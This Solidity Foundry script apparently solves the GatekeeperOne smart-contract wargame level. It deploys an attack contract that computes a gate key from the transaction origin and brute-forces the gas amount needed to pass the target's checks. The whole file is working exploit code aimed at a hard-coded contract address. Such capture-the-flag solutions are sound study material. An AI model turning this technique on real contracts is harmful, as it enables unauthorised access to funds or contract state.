//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";
 
contract GatekeeperOneSolution is Script {

    GatekeeperOne gateKeeperInstance = GatekeeperOne(0x7358B397eFa74Adc45d2397dcefb14580e2cD960);

    function run() external {
    
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("entrant:", gateKeeperInstance.entrant());
        GateKeeperAttack attackContract = new GateKeeperAttack(address(gateKeeperInstance));
        attackContract.attack();
        console.log("entrant:", gateKeeperInstance.entrant());
        vm.stopBroadcast();
    }
}

contract GateKeeperAttack {
    GatekeeperOne gateKeeperInstance;

    constructor(address target) {
        gateKeeperInstance = GatekeeperOne(target);
    }

    function attack() public {
        bytes2 originAddressLast2Bytes = bytes2(uint16(uint160(tx.origin)));
        bytes8 gateKey = bytes8(uint64(uint16(originAddressLast2Bytes)) + 2 ** 32);


    
        //*Applying brute force until we get a `true` result 

        for(uint256 i = 0; i < 120; i++){
          (bool result ,) = address(gateKeeperInstance).call{gas: i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", gateKey));

          if(result){
            break;
            }
        }
    }
}
